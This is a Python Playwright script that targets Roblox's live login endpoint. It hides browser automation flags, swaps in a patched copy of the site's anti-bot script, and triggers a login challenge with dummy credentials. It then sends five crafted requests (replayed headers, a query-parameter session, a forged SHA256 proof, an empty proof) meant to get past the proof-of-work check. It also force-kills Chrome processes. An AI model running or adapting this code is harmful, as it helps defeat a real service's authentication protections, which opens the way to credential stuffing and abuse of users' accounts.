"""Try to solve proofofwork challenge with different strategies."""
import os, time, json, base64, hashlib, hmac

os.system("taskkill /F /IM chrome.exe 2>$null")
time.sleep(2)

from playwright.sync_api import sync_playwright

with open("main_min.js", "r", encoding="utf-8") as f:
    px_script = f.read()

patched = px_script
patched = patched.replace('new Function("return this")()', "(window||self||globalThis)")
patched = patched.replace("new EvalError", "new Error")

with sync_playwright() as p:
    browser = p.chromium.launch(
        headless=False,
        args=['--disable-blink-features=AutomationControlled']
    )
    page = browser.new_page()
    
    def intercept(route):
        url = route.request.url
        if 'main.min.js' in url and ('px-cloud' in url or 'px-cdn' in url):
            route.fulfill(status=200, body=patched, content_type='application/javascript')
        else:
            route.continue_()
    
    page.route("**/main.min.js", intercept)
    
    page.goto("https://www.roblox.com/login", wait_until="domcontentloaded")
    time.sleep(8)
    
    page.fill("input[name='username']", "testuser123")
    page.fill("input[name='password']", "wrongpass123!")
    
    print("[*] Clicking login...", flush=True)
    
    chal_data = {}
    
    try:
        with page.expect_response(
            lambda r: 'auth.roblox.com' in r.url and '/v2/login' in r.url,
            timeout=15000
        ) as response_info:
            page.click("#login-button", timeout=5000)
        
        resp = response_info.value
        print(f"[+] Auth: {resp.status}", flush=True)
        
        headers = dict(resp.headers)
        chal_data['type'] = headers.get('rblx-challenge-type', '')
        chal_data['id'] = headers.get('rblx-challenge-id', '')
        chal_data['csrf'] = headers.get('x-csrf-token', '')
        chal_meta_b64 = headers.get('rblx-challenge-metadata', '')
        
        if chal_meta_b64:
            pad = len(chal_meta_b64) % 4
            if pad:
                chal_meta_b64 += '=' * (4 - pad)
            meta = json.loads(base64.b64decode(chal_meta_b64))
            chal_data['session_id'] = meta.get('sessionId', '')
            chal_data['generic_id'] = meta.get('sharedParameters', {}).get('genericChallengeId', '')
            
        print(f"[+] session_id: {chal_data.get('session_id','')[:20]}...", flush=True)
        print(f"[+] generic_id: {chal_data.get('generic_id','')[:20]}...", flush=True)
        
    except Exception as e:
        print(f"[-] Auth error: {e}", flush=True)
        time.sleep(10)
        browser.close()
        exit()
    
    # Now try various proof strategies using page.evaluate (in browser context)
    session_id = chal_data.get('session_id', '')
    challenge_id = chal_data.get('id', '')
    generic_id = chal_data.get('generic_id', '')
    csrf = chal_data.get('csrf', '')
    chal_meta_b64 = headers.get('rblx-challenge-metadata', '')
    
    strategies = {}
    
    # Strategy 1: Just retry with challenge headers (no proof)
    r1 = page.evaluate(f"""() => {{
        return fetch('https://auth.roblox.com/v2/login', {{
            method: 'POST',
            credentials: 'include',
            headers: {{
                'Content-Type': 'application/json',
                'x-csrf-token': '{csrf}',
                'rblx-challenge-id': '{challenge_id}',
                'rblx-challenge-metadata': '{chal_meta_b64}',
                'rblx-challenge-type': 'proofofwork'
            }},
            body: JSON.stringify({{"ctype": "Password"}})
        }}).then(async r => ({{status: r.status, body: await r.text().catch(() => '')}}));
    }}""")
    strategies['retry_same'] = f"{r1['status']}: {r1.get('body','')[:100]}"
    print(f"[+] Retry same: {strategies['retry_same']}", flush=True)
    
    # Strategy 2: Retry with incremental timeout (maybe time-based challenge)
    time.sleep(3)
    r2 = page.evaluate(f"""() => {{
        return fetch('https://auth.roblox.com/v2/login', {{
            method: 'POST', credentials: 'include',
            headers: {{'Content-Type': 'application/json', 'x-csrf-token': '{csrf}'}},
            body: JSON.stringify({{"ctype": "Password"}})
        }}).then(async r => ({{status: r.status, headers: Object.fromEntries(r.headers.entries())}}));
    }}""")
    strategies['fresh_no_challenge'] = f"status={r2['status']}, type={r2.get('headers',{}).get('rblx-challenge-type','none')}" 
    print(f"[+] Fresh no challenge: {strategies['fresh_no_challenge']}", flush=True)
    
    # Strategy 3: Try with sessionId as a query param
    r3 = page.evaluate(f"""() => {{
        return fetch('https://auth.roblox.com/v2/login?sessionId={session_id}', {{
            method: 'POST', credentials: 'include',
            headers: {{'Content-Type': 'application/json', 'x-csrf-token': '{csrf}'}},
            body: JSON.stringify({{"ctype": "Password"}})
        }}).then(async r => ({{status: r.status, body: await r.text().catch(() => '')}}));
    }}""")
    strategies['query_session'] = f"{r3['status']}: {r3.get('body','')[:100]}"
    print(f"[+] Query session: {strategies['query_session']}", flush=True)
    
    # Strategy 4: Try to compute SHA256 of sessionId as proof
    proof = hashlib.sha256(session_id.encode()).hexdigest()
    r4 = page.evaluate(f"""() => {{
        return fetch('https://auth.roblox.com/v2/login', {{
            method: 'POST', credentials: 'include',
            headers: {{'Content-Type': 'application/json', 'x-csrf-token': '{csrf}',
                      'rblx-challenge-id': '{challenge_id}',
                      'rblx-challenge-metadata': '{chal_meta_b64}'}},
            body: JSON.stringify({{"ctype": "Password", "proofOfWorkSolution": "{proof}"}})
        }}).then(async r => ({{status: r.status, body: await r.text().catch(() => '')}}));
    }}""")
    strategies['sha_proof'] = f"{r4['status']}: {r4.get('body','')[:100]}"
    print(f"[+] SHA proof: {strategies['sha_proof']}", flush=True)
    
    # Strategy 5: Try with empty/blank proof
    r5 = page.evaluate(f"""() => {{
        return fetch('https://auth.roblox.com/v2/login', {{
            method: 'POST', credentials: 'include',
            headers: {{'Content-Type': 'application/json', 'x-csrf-token': '{csrf}',
                      'rblx-challenge-id': '{challenge_id}',
                      'rblx-challenge-metadata': '{chal_meta_b64}'}},
            body: JSON.stringify({{"ctype": "Password", "proofOfWorkSolution": ""}})
        }}).then(async r => ({{status: r.status, body: await r.text().catch(() => '')}}));
    }}""")
    strategies['empty_proof'] = f"{r5['status']}: {r5.get('body','')[:100]}"
    print(f"[+] Empty proof: {strategies['empty_proof']}", flush=True)
    
    print(f"\n=== Summary ===", flush=True)
    for k, v in strategies.items():
        print(f"  {k}: {v}", flush=True)
    
    page.screenshot(path="proof_strategies.png")
    time.sleep(10)
    browser.close()
